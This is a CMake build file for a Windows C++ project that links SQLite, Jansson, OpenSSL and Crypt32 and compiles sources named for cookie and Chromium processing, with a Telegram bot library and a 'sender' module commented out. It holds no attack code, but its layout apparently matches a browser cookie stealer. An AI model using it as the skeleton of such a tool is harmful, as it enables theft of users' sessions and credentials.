CMAKE_MINIMUM_REQUIRED(VERSION 3.0)

PROJECT(project-612)
SET(CMAKE_CXX_FLAGS "-Wall -O1")

INCLUDE_DIRECTORIES("${CMAKE_SOURCE_DIR}/sqlite-3.8.7")
INCLUDE_DIRECTORIES("${CMAKE_SOURCE_DIR}/jansson-2.9")
#INCLUDE_DIRECTORIES("${CMAKE_SOURCE_DIR}/tgbot-cpp/include")

ADD_SUBDIRECTORY("${CMAKE_SOURCE_DIR}/sqlite-3.8.7")
ADD_SUBDIRECTORY("${CMAKE_SOURCE_DIR}/jansson-2.9")
#ADD_SUBDIRECTORY("${CMAKE_SOURCE_DIR}/tgbot-cpp")

#LINK_LIBRARIES(jansson sqlite ssl crypto TgBot ws2_32 Crypt32 stdc++fs)
LINK_LIBRARIES(jansson sqlite ssl crypto ws2_32 Crypt32 stdc++fs)

ADD_EXECUTABLE(${PROJECT_NAME}
    "project-612.cpp" "project-612.hpp"
#    "sender.cpp" "sender.hpp"
    "tools.cpp" "tools.hpp"
    "cookie.cpp" "cookie.hpp"
    "chromium_processor.cpp" "chromium_processor.hpp")
